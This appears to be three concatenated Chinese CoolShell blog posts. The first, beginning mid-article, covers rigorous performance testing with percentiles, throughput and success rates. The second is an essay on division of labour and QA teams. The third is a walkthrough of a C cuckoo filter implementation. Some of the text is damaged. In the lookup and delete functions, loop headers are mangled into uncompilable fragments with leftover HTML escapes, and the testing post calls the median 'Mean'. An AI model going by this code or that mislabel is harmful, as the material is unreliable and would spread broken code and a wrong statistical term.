**1）用的全是平均值**。老实说，平均值是非常不靠谱的。

**2）响应时间没有和吞吐量TPS/QPS挂钩**。而只是测试了低速率的情况，这是完全错误的。

**3）响应时间和吞吐量没有和成功率挂钩。**



目录



[为什么平均值不靠谱](https://coolshell.cn/articles/17381.html#为什么平均值不靠谱)[为什么响应时间（latency）要和吞吐量（Thoughput）挂钩](https://coolshell.cn/articles/17381.html#为什么响应时间（latency）要和吞吐量（Thoughput）挂钩)[为什么响应时间吞吐量和成功率要挂钩](https://coolshell.cn/articles/17381.html#为什么响应时间吞吐量和成功率要挂钩)[如何严谨地做性能测试](https://coolshell.cn/articles/17381.html#如何严谨地做性能测试)

#### 为什么平均值不靠谱

关于平均值为什么不靠谱，我相信大家读新闻的时候经常可以看到，**平均工资**，**平均房价**，**平均支出**，等等这样的字眼，你就知道为什么平均值不靠谱了。（这些都是数学游戏，对于理工科的同学来说，天生应该有免疫力）

软件的性能测试也一样，平均数也是不靠谱的，这里可以参看这篇详细的文章《[Why Averages Suck and Percentiles are Great](http://apmblog.dynatrace.com/2012/11/14/why-averages-suck-and-percentiles-are-great/)》，我在这里简单说一下。

我们知道，性能测试时，测试得到的结果数据不总是一样的，而是有高有低的，如果算平均值就会出现这样的情况，假如，测试了10次，有9次是1ms，而有1次是1s，那么平均数据就是100ms，很明显，这完全不能反应性能测试的情况，也许那1s的请求就是一个不正常的值，是个噪点，应该去掉。所以，我们会在一些评委打分中看到要去掉一个最高分一个最低分，然后再算平均值。

另外，中位数（Mean）可能会比平均数要稍微靠谱一些，所谓中位数的意就是把将一组数据按大小顺序排列，处在最中间位置的一个数叫做这组数据的中位数 ，这意味着至少有50%的数据低于或高于这个中位数。

当然，最为正确的统计做法是用百分比分布统计。也就是英文中的TP – Top Percentile ，TP50的意思在，50%的请求都小于某个值，TP90表示90%的请求小于某个时间。

比如：我们有一组数据：[ 10ms, 1s, 200ms, 100ms]，我们把其从小到大排个序：[10ms, 100ms, 200ms, 1s]，于是我们知道，TP50，就是50%的请求ceil(4*0.5)=2时间是小于100ms的，TP90就是90%的请求ceil(4*0.9)=4时间小于1s。于是：TP50就是100ms，TP90就是1s。

我以前在路透做的金融系统响应时间的性能测试的要求是这样的，**99.9%的请求必须小于1ms，所有的平均时间必须小于1ms。两个条件的限制。**

#### 为什么响应时间（latency）要和吞吐量（Thoughput）挂钩

系统的性能如果只看吞吐量，不看响应时间是没有意义的。我的系统可以顶10万请求，但是响应时间已经到了5秒钟，这样的系统已经不可用了，这样的吞吐量也是没有意义的。

我们知道，当并发量（吞吐量）上涨的时候，系统会变得越来越不稳定，响应时间的波动也会越来越大，响应时间也会变得越来越慢，而吞吐率也越来越上不去（如下图所示），包括CPU的使用率情况也会如此。所以，当系统变得不稳定的时候，吞吐量已经没有意义了。吞吐量有意义的时候仅当系统稳定的时候。

![BenchmarkOptimalRate](photo/BenchmarkOptimalRate.png)

所以，**吞吐量的值必需有响应时间来卡。**比如：**TP99小于100ms的时候，系统可以承载的最大并发数是1000qps**。这意味着，我们要不断的在不同的并发数上测试，以找到软件的最稳定时的最大吞吐量。

 

#### 为什么响应时间吞吐量和成功率要挂钩

我们这应该不难理解了，如果请求不成功的话，都还做毛的性能测试。比如，我说我的系统并发可以达到10万，但是失败率是

40%，那么，这10万的并发完全就是一个笑话了。

性能测试的失败率的容忍应该是非常低的。对于一些关键系统，成功请求数必须在100%，一点都不能含糊。

 

#### 如何严谨地做性能测试

一般来说，性能测试要统一考虑这么几个因素：**Thoughput吞吐量**，**Latency响应时间**，**资源利用**（CPU/MEM/IO/Bandwidth…），**成功率**，**系统稳定性**。

下面的这些性能测试的方式基本上来源自我的老老东家汤森路透，一家做real-time的金融数据系统的公司。

**一，你得定义一个系统的响应时间latency，建议是TP99，以及成功率**。比如路透的定义：99.9%的响应时间必需在1ms之内，平均响应时间在1ms以内，100%的请求成功。

**二，在这个响应时间的限制下，找到最高的吞吐量**。测试用的数据，需要有大中小各种尺寸的数据，并可以混合。最好使用生产线上的测试数据。

**三，在这个吞吐量做Soak Test，比如：使用第二步测试得到的吞吐量连续7天的不间断的压测系统。**然后收集CPU，内存，硬盘/网络IO，等指标，查看系统是否稳定，比如，CPU是平稳的，内存使用也是平稳的。那么，这个值就是系统的性能

**四，找到系统的极限值。比如：在成功率100%的情况下（不考虑响应时间的长短），系统能坚持10分钟的吞吐量。**

**五，做Burst Test。用第二步得到的吞吐量执行5分钟，然后在第四步得到的极限值执行1分钟，再回到第二步的吞吐量执行5钟，再到第四步的权限值执行1分钟，如此往复个一段时间，比如2天。**收集系统数据：CPU、内存、硬盘/网络IO等，观察他们的曲线，以及相应的响应时间，确保系统是稳定的。

**六、低吞吐量和网络小包的测试。**有时候，在低吞吐量的时候，可能会导致latency上升，比如TCP_NODELAY的参数没有开启会导致latency上升（详见[TCP的那些事](https://coolshell.cn/articles/11564.html)），而网络小包会导致带宽用不满也会导致性能上不去，所以，性能测试还需要根据实际情况有选择的测试一下这两咱场景。

（注：在路透，路透会用第二步得到的吞吐量乘以66.7%来做为系统的软报警线，80%做为系统的硬报警线，而极限值仅仅用来扛突发的peak）

**是不是很繁锁？是的，只因为，这是工程，工程是一门科学，科学是严谨的。**

欢迎大家也分享一下你们性能测试的经验和方法。

（全文完）

# 让我们来谈谈分工

#####  [2015年12月13日 ](https://coolshell.cn/articles/17295.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [122 条评论](https://coolshell.cn/articles/17295.html#comments) 97,397 人阅读

![Division of Labour](photo/Division_of_Labour.jpeg)昨天，我看到[一个新闻](http://spectrum.ieee.org/view-from-the-valley/computing/software/yahoos-engineers-move-to-coding-without-a-net)——雅虎取消了QA团队，工程师必须自己负责代码质量，并使用持续集成代替QA。 同时，也听到网友说，“听微软做数据库运维的工程师介绍，他们也是把运维工程师和测试工程师取消了，由开发全部完成。每个人都是全栈工程师”。于是，我顺势引用了几年前写过一篇文章《[我们需要专职的QA吗？](https://coolshell.cn/articles/6994.html)》，并且又鼓吹了一下全栈。当然，一如既往的得到了一些的争议和嘲弄;-)。

有人认为取消QA基本上是公司没钱的象征，这个观点根本不值一驳，属于井底之蛙。有人认为，社会分工是大前提，并批评我说怎么不说把所有的事全干的，把我推向了另外一个极端。另外，你千万不要以为有了分工，QA的工作就保得住了。

就像《乔布斯传》中乔布斯质疑财务制度的时候说的，有时候，很多人都不问为什么，觉得存在的东西都是理所应当的东西。让我们失去了独立思考的机会。分工也是一样。

所以，为了说完整分工这个逻辑。请大家耐住性子，让我就先来谈谈“分工的优缺点”吧。



目录



[分工的优点和缺点](https://coolshell.cn/articles/17295.html#分工的优点和缺点)[全球化下的分工](https://coolshell.cn/articles/17295.html#全球化下的分工)[分工的温床和天敌](https://coolshell.cn/articles/17295.html#分工的温床和天敌)[什么样分工才是好的](https://coolshell.cn/articles/17295.html#什么样分工才是好的)[小结](https://coolshell.cn/articles/17295.html#小结)

#### 分工的优点和缺点

首先，分工（Division of Labour）应该是由 [Adam Smith](https://en.wikipedia.org/wiki/Adam_Smith) 在1776年的《[国富论](https://en.wikipedia.org/wiki/The_Wealth_of_Nations)》中提出来的，Adam在那时候就观察到分工对于手工业生产效率的提高。他将效率提高的原因归结于三点：

- 熟练程度的增加。当一个工人单纯地重复同一道工序时，其对这道工序的熟练程度会大幅增加。**表现为产量和质量的提高**。
- 如果没有分工，由一道工序转为另一道工序时会损失时间，而分工避免了这中间的损失。
- 由于对于工序的了解和熟练度的增加，**更有效率的机械和工具被发明出来，从而提高了产量**。

分工的确是提高生产力。我想到了福特公司一开始做出来的汽车几乎卖不出去，原因有两个，一个是成本太高，另外是生产太复杂，产能太低。于是福特公司开始把制造一辆汽车的工序分解开来，进行分工，分工给福特公司带来的好处是：

1. 很多工作可以并行了，而且**因为事情变得简单后，执行力也变强了**
2. 一个非常复杂和高深的汽车制造因为分工后，**很多工作不需要很NB的人来干了，只需要一般劳动者经过简单的培训就可以干了**。而且，越干越熟练，越干越专业，最终可能让合适的人合适的事。
3. 分工后导致了很多重复劳动可以用技术来解决，于是福特公司出现生产流水线的技术（你是否还记得卓别林《摩登时代》里的工业生产流水线的场景，那取自福特公司）。

于是，福特公司的生产效率大大提高，最终实现了让每个美国家庭都能买得起汽车的理想，同时让美国成为了轮子上的国家。

不过，我们需要注意的是，在《国富论》中，Adam他同时也提到，分工如果过细，同样会带来问题——**简单重复的劳动会让人变成一个不会思考的机器，从而越来越笨，进而变成平庸的无技能的人**。自“分工”出现以后，争论就没有停止过。

Karl Max同样认为**分工越来越细，会导致人的技术越来越差，同时，大量的重复劳动也会导致人对工作的失出热情，产生厌倦和抵触心理，最终会导致生产力的下降**。

同时，还有一些经济学家也同样表明分工的一些缺点：

- **导致人只关注整个事情中的一小块，缺乏全局视角，导致视野受限，没有完全领会工作的意义和目标，从而导致各种返工**。

- **对于组织而言，分工也会导致出现大量的沟通协同成本，并出现碎片的生产方式，以及组织的孤岛形式，并不利于提高生产力**。

当然，奥地利经济学家[Ludwig von Mises](https://en.wikipedia.org/wiki/Ludwig_von_Mises) 并不这么认为，他认为，在分工所得到的好处面前，这些副作用不算什么。并且，他认为在资本主义的制度下，完全是可以平衡分工的各种优点和各种缺点，从而可以达到提高生产力和提高人员素质的双赢解的。

比如说，**分工中的各种沟通问题是可以通过一个标准协议来解的**，造灯泡的，造开关的，造灯座的完全不知道对方的存在，他们只所以可以让做出来的东西拼在一起，完全是通过了一种标准协议完成的。**这也是为什么这个世界上有各种各样的标准化的组织**。

还有很多经济学家对分工都有自己的见解和想法。不过基本上就是上面这些Pros和Cons了。下图是一个PPT的两个slids，可以点击看大图（[来源](http://www.slideshare.net/kamran121/lecture-5-10123392)）

| [![lecture-5-10-728](photo/lecture-5-10-728.jpg)](https://coolshell.cn/wp-content/uploads/2015/12/lecture-5-10-728.jpg) | [![lecture-5-11-728](photo/lecture-5-11-728.jpg)](https://coolshell.cn/wp-content/uploads/2015/12/lecture-5-11-728.jpg) |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
|                                                              |                                                              |

#### 全球化下的分工

分工带来问题在全球化的浪潮下变得尤为突出。其委婉地被讲成是比较优势（[Comparative Advantage](https://en.wikipedia.org/wiki/Comparative_advantage)）

**比较优势（**又叫**相对优势**）是经济学的概念，解释了为何在拥有相对的机会成本的优势下生产，贸易对双方都有利。当一方（一个人，一间公司，或一国）进行一项生产时所付出的机会成本比另一方低，这一方面拥有了进行这项生产的比较优势。于是，一个国家倘若专门生产自己相对优势较大的产品，并通过国际贸易换取自己不具有相对优势的产品就能获得利益。

于是乎，分工本来想要的是——合适的人干合适的事，**但是在比较优势的情况下，商业社会把分工变成了**——**不是选择合适的人、公司或国家，而是选择成本低的人、公司或国家**。

经济合作与发展组织[OECD](https://en.wikipedia.org/wiki/OECD)最近（2015年6月28日）对全球化这样建议的——

> “有效率的政策的本质不是阻止失业而是鼓励就业，如果各个国家都在收获全球化的利益而不是开放贸易的话，那么一些地方就会失去工作机会，当然也伴随着在另一些地方出现新的工作机会，这是全球化进程不可避免的，而我们面对的挑战是怎么能流畅调整我们的流程，能为那些新出现的工作机会找到合适的技能匹配的工人”。

通过上面的说明，我想你可以知道，为什么中国成为了世界劳动力大国，而为什么当初美国科技公司进入中国的时候，首先把测试的工作放到了中国。这就是所谓的全球化分工。同时我们也可以看到，像我们中国这样技术能力的确非常不足的国家，的确是可以通过分工这种形式，让我们这些技能一般的技术人员参与一个复杂的有技术含量的项目当中。这其中就是分工的光明面和阴暗面。

那么，我们想一想，**随着中国的人力成本的越来越大，国际化的分工因为商业资本的因素，必然不会选择中国，只会选择人力成本更低的国家，比如印度、越南、甚至人力成本更低的国家**。美国雅虎和Adobe不是离开中国了么？再看看中国因为人民币的汇率或是人力成本的上升，我们在早几年关了多少个Made in China的工厂，这就是全球化的分工，商业上来说，他不是找最合适的人，而是找成本最低的人。

所以，**你千万不要以为我一提倡全栈了，你QA的工作就保不住了，就算没有全栈，就算是你还在坚持的社会化的分工，也可能让你的QA的工作就保不住了，除非，你能提供更低的价格**。（想想这其中的逻辑吧，人家美国人把一些技术工作（比如测试）外包到中国的原因不是因为中国人聪明，想得周全，适合干这个测试这个事，而是因为中国人廉价，所以，当中国不在廉价了，自然就会找更廉价的地方了）

为什么国家要从Made in China转型？不就是因为中国早期拿到的国际化分工就是这些没有技术含量的支持性的分工么？也因此而造就了大量的技能很一般的工人。为了能在全球化分工中能拿到更有质量的工作，**我们必然要从劳动密集型转向成知识密集型，必然要从支持性的工作转变为产出性的工作，必然需要单一技能型的技工转变为复合型的人才**。

#### 分工的温床和天敌

**分工的温床主要有两个**，

- **一个是成本和效率**，资本家或企业主或一个国家为了追求更快成本更底的生产方式，他们必然会进行大规模的分工，伴随着分工，他们也会把一些知识或技术密集型的工作生生地变成劳动密集型的工作。然后层层外包。

- **一个是组织的大小**，当一个组织的人数不断的变大，那么，你只能把工作和任务分得更细。这是被人数逼的，而不是实际需要的。这就是为什么我们可以看到很多大公司里要么人浮于事，要么瞎忙。

**分工的天敌主要有一个——那就是技术**！

每当新技术出现的时候，一些复杂的工序会被一台机器或是一种高超的技术所取代，不管是被技术自动化，还是被技术所简化**，**总之，以前本来需要数十人或是数百人才能干的事，突然之间只需要一个人就可以干完了。生产力得到了巨大的释放。所以，你这就是我们常听的——**科技是第一生产力！**

说到这里，让我们再来看看雅虎的那条新闻——

> 在软件开发流程中去掉QA团队会发生什么？更少的代码错误，更快的开发周期。这是雅虎工程师过去一年的实验结果。**雅虎的Warp Drive计划将程序开发从批发布转移了持续交付模式**，工程师的代码不经过QA团队的人工检查而是直接发布。**开发模式的转变导致了处理问题理念的根本性改变，迫使工程师开发自动检查工具去识别原来由人工检查发现的错误**。雅虎的技术团队现在全部是工程师，而不再有QA团队容身之处。雅虎的首席架构师 Amotz Maimon说，他们本来预计可能会发生严重问题，结果出乎意料，每个曾经对此抱有怀疑态度的人都说新做法很有效。

所以，**当你面对一些难题的时候，比如线上的故障，或是一个复杂的软件生产活动，你是要加更多的流程更多的人呢，还是要用技术解决问题呢？一边是温床，一边是天敌，你想好了吗？**

#### 什么样分工才是好的

分工是必然的，因为很简单，你不可能一个人干完所有的事情，所以必需要分工，**分工不是问题，而问题则变成了——什么样的分工是理想的，是优雅的，是有效率的？**

![华君武漫画《科学分工？》](photo/hua_junwu_17.jpg)**[华君武](https://zh.wikipedia.org/zh/华君武)漫画《科学分工？》**

对于分工来说，一般来是一种组织和管理形为。就目前来说，现代的公司有两种分工模式，分别是**Control** 和 **Commitment** 这两种分工。

- **Control就是控制型的管理，它是一种是基于工作技能的分工，于是员工会被这种分工分配到一个比较窄的技能里去完成一个非常明确的工作**。

- **而Commitment则是面向员工的责任心和所承担的目标来分工并完成工作的。相比起前者来说，这样的分工在完成工作时，需要的不仅仅是技能，还需要更多的责任感**。

这么说吧，

- 对于基于工作技能的分工，你会看到，这样的公司会把技术人员按编程语言来分，比如：Java、PHP、C/C++，或是分成：Web端、iOS端、Android端、后端、算法、数据。或是分成：开发，测试，运维。

- 对于基于Commitment的分工，你会看到他们这样分的，软件工程师（不分前后端，不分语言，不分运维，测试），因为这样的公司认为，他招的不是只有特定语言技能的Coder，而是而学多种语言多种技术能保证软件质量以及能对软件维护的软件工程师。这种公司的软件工程师是各种团队都可以去的，而他们的分工更多的是按软件的功能，软件的模块，或是软件的产品线来分工。

基于技能的分工已是过去时，而基于 Commitment 的分工是更有效率的分工的未来。你可以参看McAlister-Kizzier, Donna. 的文献 “[Division of Labor.](http://www.encyclopedia.com/topic/Division_of_labor.aspx#3)” 。

#### 小结

我说了这么多，不知道你看懂了我想表达什么没有？我不强加我的价值观，只希望你自己问自己几个问题：

1）作为工作的人，在分工中你会怎样选择？是成为一颗棋子，一颗螺丝钉，还是成为一个多面手？

2）作为工作的人，当你选择工作或任务的时候，你是选择做支持性的工作，还是做产出性的工作？你是选择做劳动密集型重复工作，还是做知识密集型的创新性的工作？

3）作为老板，你是想要什么样的员工？听话的只会加班和干重复工作的劳动力，还是有责任心的为企业和产品负责的员工？

4）作为老板，你是想通过分工释放低端员工的生产力，还是通过科技或技术去创造更NB的生产力？

5）作为老板，分工中的问题，你找到比较优的解了吗？比如，对于不同团队间的协议，你找到了吗？

可能，在不同的情况下你会有不同的答案。但是对我来说呢，无论是什么情况，我都只会有一个答案。

（全文完）

# CUCKOO FILTER：设计与实现

#####  [2015年09月02日 ](https://coolshell.cn/articles/17225.html) [Leo](https://coolshell.cn/articles/author/full_of_bull) 评论 [37 条评论](https://coolshell.cn/articles/17225.html#comments) 68,811 人阅读

**（感谢网友** [**@我的上铺叫路遥**](http://weibo.com/fullofbull) **投稿）**

![img](photo/cuckoo-300x164.jpg)

对于海量数据处理业务，我们通常需要一个索引数据结构，用来帮助查询，快速判断数据记录是否存在，这种数据结构通常又叫过滤器(filter)。考虑这样一个场景，上网的时候需要在浏览器上输入URL，这时浏览器需要去判断这是否一个恶意的网站，它将对本地缓存的成千上万的URL索引进行过滤，如果不存在，就放行，如果（可能）存在，则向远程服务端发起验证请求，并回馈客户端给出警告。

索引的存储又分为有序和无序，前者使用关联式容器，比如B树，后者使用哈希算法。这两类算法各有优劣：比如，关联式容器时间复杂度稳定O(logN)，且支持范围查询；又比如哈希算法的查询、增删都比较快O(1)，但这是在理想状态下的情形，遇到碰撞严重的情况，哈希算法的时间复杂度会退化到O(n)。因此，选择一个好的哈希算法是很重要的。

时下一个非常流行的哈希索引结构就是**[bloom filter](https://en.wikipedia.org/wiki/Bloom_filter)**，它类似于bitmap这样的hashset，所以空间利用率很高。其独特的地方在于它使用多个哈希函数来避免哈希碰撞，如图所示（[来源wikipedia](https://en.wikipedia.org/wiki/Bloom_filter)），bit数组初始化为全0，插入x时，x被3个哈希函数分别映射到3个不同的bit位上并置1，查询x时，只有被这3个函数映射到的bit位全部是1才能说明x可能存在，但凡至少出现一个0表示x肯定不存在。

![Bloom_filter](photo/Bloom_filter.png)



但是，bloom filter的这种位图模式带来两个问题：一个是**误报（false positives）**，在查询时能提供“一定不存在”，但只能提供“可能存在”，因为存在其它元素被映射到部分相同bit位上，导致该位置1，那么一个不存在的元素可能会被误报成存在；另一个是**漏报（false nagatives）**，同样道理，如果删除了某个元素，导致该映射bit位被置0，那么本来存在的元素会被漏报成不存在。由于后者问题严重得多，所以bloom filter必须确保“definitely no”从而容忍“probably yes”，不允许元素的删除。

关于元素删除的问题，一个改良方案是对bloom filter引入计数，但这样一来，原来每个bit空间就要扩张成一个计数值，空间效率上又降低了。

#### Cuckoo Hashing

为了解决这一问题，本文引入了一种新的哈希算法——**cuckoo filter**，它既可以确保该元素存在的必然性，又可以在不违背此前提下删除任意元素，仅仅比bitmap牺牲了微量空间效率。先说明一下，这个算法的思想来源是一篇[CMU论文](http://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pdf)，笔者按照其思路用C语言做了一个简单实现（[Github](https://github.com/begeekmyfriend/CuckooFilter)），附上对一段文本数据进行导入导出的正确性测试。

接下来我会结合自己的示例代码讲解哈希算法的实现。我们先来看看cuckoo hashing有什么特点，它的哈希函数是成对的（具体的实现可以根据需求设计），每一个元素都是两个，分别映射到两个位置，一个是记录的位置，另一个是备用位置。这个备用位置是处理碰撞时用的，这就要说到cuckoo这个名词的典故了，中文名叫布谷鸟，这种鸟有一种即狡猾又贪婪的习性，它不肯自己筑巢，而是把蛋下到别的鸟巢里，而且它的幼鸟又会比别的鸟早出生，布谷幼鸟天生有一种残忍的动作，幼鸟会拼命把未出生的其它鸟蛋挤出窝巢，今后以便独享“养父母”的食物。借助生物学上这一典故，cuckoo hashing处理碰撞的方法，就是把原来占用位置的这个元素踢走，不过被踢出去的元素还要比鸟蛋幸运，因为它还有一个备用位置可以安置，如果备用位置上还有人，再把它踢走，如此往复。直到被踢的次数达到一个上限，才确认哈希表已满，并执行rehash操作。如下图所示（[图片来源](http://codecapsule.com/2013/07/20/cuckoo-hashing/)）：

[![cuckoo_preview](photo/cuckoo_preview.jpg)](http://codecapsule.com/2013/07/20/cuckoo-hashing/)

 

我们不禁要问发生哈希碰撞之前的空间利用率是多少呢？不幸地告诉你，一维数组的哈希表上跟其它哈希函数没什么区别，也就50%而已。但如果是二维的呢？

一个改进的哈希表如下图所示，每个桶（bucket）有4路槽位（slot）。当哈希函数映射到同一个bucket中，在其它三路slot未被填满之前，是不会有元素被踢的，这大大缓冲了碰撞的几率。笔者自己的简单实现上测过，采用二维哈希表（4路slot）大约80%的占用率（CMU论文数据据说达到90%以上，应该是扩大了slot关联数目所致）。

![cuckoo hashing](photo/cuckoo-hashing-1024x392.png)

#### Cuckoo Filter设计与实现

cuckoo hashing的原理介绍完了，下面就来演示一下笔者自己实现的一个cuckoo filter应用，简单易用为主，不到500行C代码。应用场景是这样的：假设有一段文本数据，我们把它通过cuckoo filter导入到一个虚拟的flash中，再把它导出到另一个文本文件中。flash存储的单元页面是一个log_entry，里面包含了一对key/value，value就是文本数据，key就是这段大小的数据的SHA1值（照理说SHA1是可以通过数据源生成，没必要存储到flash，但这里主要为了测试而故意设计的，万一key和value之间没有推导关系呢）。

```
#define SECTOR_SIZE    (1 << 10)
#define DAT_LEN        (SECTOR_SIZE - 20)  /* minus sha1 size */

/* The log entries store key-value pairs on flash and the
 * size of each entry is assumed just one sector fit.
 */
struct log_entry {
        uint8_t sha1[20];
        uint8_t data[DAT_LEN];
};
```

顺便说明一下DAT_LEN设置，之前我们设计了一个虚拟flash（用malloc模拟出来），由于flash的单位是按页大小SECTOR_SIZE读写，这里假设每个log_entry正好一个页大小，当然可以根据实际情况调整。

以上是flash的存储结构，至于哈希表里的slot有三个成员tag，status和offset，分别是哈希值，状态值和在flash的偏移位置。其中status有三个枚举值：AVAILIBLE，OCCUPIED，DELETED，分别表示这个slot是空闲的，占用的还是被删除的。至于tag，按理说应该有两个哈希值，对应两个哈希函数，但其中一个已经对应bucket的位置上了，所以我们只要保存另一个备用bucket的位置就行了，这样万一被踢，只要用这个tag就可以找到它的另一个安身之所。

```
enum { AVAILIBLE, OCCUPIED, DELETED, };

/* The in-memory hash bucket cache is to filter keys (which is assumed SHA1) via
 * cuckoo hashing function and map keys to log entries stored on flash.
 */
struct hash_slot_cache {
        uint32_t tag : 30;  /* summary of key */
        uint32_t status : 2;  /* FSM */
        uint32_t offset;  /* offset on flash memory */
};
```

乍看之下size有点大是吗？没关系，你也可以根据情况调整数据类型大小，比如uint16_t，这里仅仅为了测试正确性。

至于哈希表以及bucket和slot的创建见初始化代码。buckets是一个二级指针，每个bucket指向4个slot大小的缓存，即4路slot，那么bucket_num也就是slot_num的1/4。这里我们故意把slot_num调小了点，为的是测试rehash的发生。

```
#define ASSOC_WAY  (4)  /* 4-way association */

struct hash_table {
    struct hash_slot_cache **buckets;
    struct hash_slot_cache *slots;
    uint32_t slot_num;
    uint32_t bucket_num;
};

int cuckoo_filter_init(size_t size)
{
    ...
    /* Allocate hash slots */
    hash_table.slot_num = nvrom_size / SECTOR_SIZE;
    /* Make rehashing happen */
    hash_table.slot_num /= 4;
    hash_table.slots = calloc(hash_table.slot_num, sizeof(struct hash_slot_cache));
    if (hash_table.slots == NULL) {
        return -1;
    }

    /* Allocate hash buckets associated with slots */
    hash_table.bucket_num = hash_table.slot_num / ASSOC_WAY;
    hash_table.buckets = malloc(hash_table.bucket_num * sizeof(struct hash_slot_cache *));
    if (hash_table.buckets == NULL) {
        free(hash_table.slots);
        return -1;
    }
    for (i = 0; i < hash_table.bucket_num; i++) {
        hash_table.buckets[i] = &hash_table.slots[i * ASSOC_WAY];
    }
}
```

下面是哈希函数的设计，这里有两个，前面提到既然key是20字节的SHA1值，我们就可以分别是对key的低32位和高32位进行位运算，只要bucket_num满足2的幂次方，我们就可以将key的一部分同bucket_num – 1相与，就可以定位到相应的bucket位置上，注意bucket_num随着rehash而增大，哈希函数简单的好处是求哈希值十分快。

```
#define cuckoo_hash_lsb(key, count)  (((size_t *)(key))[0] & (count - 1))
#define cuckoo_hash_msb(key, count)  (((size_t *)(key))[1] & (count - 1))
```

终于要讲解cuckoo filter最重要的三个操作了——查询、插入还有删除。查询操作是简单的，我们对传进来的参数key进行两次哈希求值tag[0]和tag[1]，并先用tag[0]定位到bucket的位置，从4路slot中再去对比tag[1]。只有比中了tag后，由于只是key的一部分，我们再去从flash中验证完整的key，并把数据在flash中的偏移值read_addr输出返回。相应的，如果bucket[tag[0]]的4路slot都没有比中，我们再去bucket[tag[1]]中比对（代码略），如果还比不中，可以肯定这个key不存在。**这种设计的好处就是减少了不必要的flash读操作，每次比对的是内存中的tag而不需要完整的key。**

```
static int cuckoo_hash_get(struct hash_table *table, uint8_t *key, uint8_t **read_addr)
{
    int i, j;
    uint8_t *addr;
    uint32_t tag[2], offset;
    struct hash_slot_cache *slot;

    tag[0] = cuckoo_hash_lsb(key, table->bucket_num);
    tag[1] = cuckoo_hash_msb(key, table->bucket_num);

    /* Filter the key and verify if it exists. */
    slot = table-&gt;buckets[tag[0]];
    for (i = 0; i bucket_num) == slot[i].tag) {
        if (slot[i].status == OCCUPIED) {
            offset = slot[i].offset;
            addr = key_verify(key, offset);
            if (addr != NULL) {
                if (read_addr != NULL) {
                    *read_addr = addr;
                }
                break;
            }
        } else if (slot[i].status == DELETED) {
            return DELETED;
        }
    }
    ...
}
```

接下来先将简单的删除操作，之所以简单是因为delete除了将相应slot的状态值设置一下之外，其实什么都没有干，也就是说它不会真正到flash里面去把数据清除掉。为什么？很简单，没有必要。还有一个原因，flash的写操作之前需要擦除整个页面，这种擦除是会折寿的，**所以很多flash支持随机读，但必须保持顺序写。**

```
static void cuckoo_hash_delete(struct hash_table *table, uint8_t *key)
{
    uint32_t i, j, tag[2];
    struct hash_slot_cache *slot;

    tag[0] = cuckoo_hash_lsb(key, table->bucket_num);
    tag[1] = cuckoo_hash_msb(key, table->bucket_num);

    slot = table->buckets[tag[0]];
    for (i = 0; i bucket_num) == slot[i].tag) {
        slot[i].status = DELETED;
        return;
    }
    ...
}
```

了解了flash的读写特性，你就知道为啥插入操作在flash层面要设计成append。不过我们这里不讨论过多flash细节，哈希表层面的插入逻辑其实跟查询差不多，我就不贴代码了。这里要贴的是如何判断并处理碰撞，其实这里也没啥玄机，就是用old_tag和old_offset保存一下临时变量，以便一个元素被踢出去之后还能找到备用的安身之所。但这里会有一个判断，每次踢人都会计数，当alt_cnt大于512时候表示哈希表真的快满了，这时候需要rehash了。

```
static int cuckoo_hash_collide(struct hash_table *table, uint32_t *tag, uint32_t *p_offset)
{
    int i, j, k, alt_cnt;
    uint32_t old_tag[2], offset, old_offset;
    struct hash_slot_cache *slot;

    /* Kick out the old bucket and move it to the alternative bucket. */
    offset = *p_offset;
    slot = table->buckets[tag[0]];
    old_tag[0] = tag[0];
    old_tag[1] = slot[0].tag;
    old_offset = slot[0].offset;
    slot[0].tag = tag[1];
    slot[0].offset = offset;
    i = 0 ^ 1;
    k = 0;
    alt_cnt = 0;

KICK_OUT:
    slot = table->buckets[old_tag[i]];
    for (j = 0; j < ASSOC_WAY; j++) {
        if (offset == INVALID_OFFSET && slot[j].status == DELETED) {
            slot[j].status = OCCUPIED;
            slot[j].tag = old_tag[i ^ 1];
            *p_offset = offset = slot[j].offset;
            break;
        } else if (slot[j].status == AVAILIBLE) {
            slot[j].status = OCCUPIED;
            slot[j].tag = old_tag[i ^ 1];
            slot[j].offset = old_offset;
            break;
        }
    }

    if (j == ASSOC_WAY) {
        if (++alt_cnt > 512) {
            if (k == ASSOC_WAY - 1) {
                /* Hash table is almost full and needs to be resized */
                return 1;
            } else {
                k++;
            }
        }
        uint32_t tmp_tag = slot[k].tag;
        uint32_t tmp_offset = slot[k].offset;
        slot[k].tag = old_tag[i ^ 1];
        slot[k].offset = old_offset;
        old_tag[i ^ 1] = tmp_tag;
        old_offset = tmp_offset;
        i ^= 1;
        goto KICK_OUT;
    }

    return 0;
}
```

rehash的逻辑也很简单，无非就是把哈希表中的buckets和slots重新realloc一下，空间扩展一倍，然后再从flash中的key重新插入到新的哈希表里去。这里有个陷阱要注意，**千万不能有相同的key混进来！**虽然cuckoo hashing不像开链法那样会退化成O(n)，但由于每个元素有两个哈希值，而且每次计算的哈希值随着哈希表rehash的规模而不同，相同的key并不能立即检测到冲突，但当相同的key达到一定规模后，噩梦就开始了，由于rehash里面有插入操作，一旦在这里触发碰撞，又会触发rehash，这时就是一个rehash不断递归的过程，由于其中老的内存没释放，新的内存不断重新分配，整个程序就如同陷入DoS攻击一般瘫痪了。**所以每次插入操作前一定要判断一下key是否已经存在过，并且对rehash里的插入使用碰撞断言防止此类情况发生。**笔者在测试中不幸中了这样的彩蛋，调试了大半天才搞清楚原因，搞IT的同学们记住一定要防小人啊~

```
static void cuckoo_rehash(struct hash_table *table)
{
    ...
    uint8_t *read_addr = nvrom_base_addr;
    uint32_t entries = log_entries;
    while (entries--) {
        uint8_t key[20];
        uint32_t offset = read_addr - nvrom_base_addr;
        for (i = 0; i &lt; 20; i++) {
            key[i] = flash_read(read_addr);
            read_addr++;
        }
        /* Duplicated keys in hash table which can cause eternal
         * hashing collision! Be careful of that!
         */
        assert(!cuckoo_hash_put(table, key, &offset));
        if (cuckoo_hash_get(&old_table, key, NULL) == DELETED) {
            cuckoo_hash_delete(table, key);
        }
        read_addr += DAT_LEN;
    }
    ...
}
```

到此为止代码的逻辑还是比较简单，使用效果如何呢？我来帮你找个大文件[unqlite.c](https://github.com/unqlite/unqlite/blob/master/unqlite.c)测试一下，这是一个嵌入式数据库源代码，共59959行代码。作为需要导入的文件，编译我们的cuckoo filter，然后执行：

```
./cuckoo_db unqlite.c output.c
```

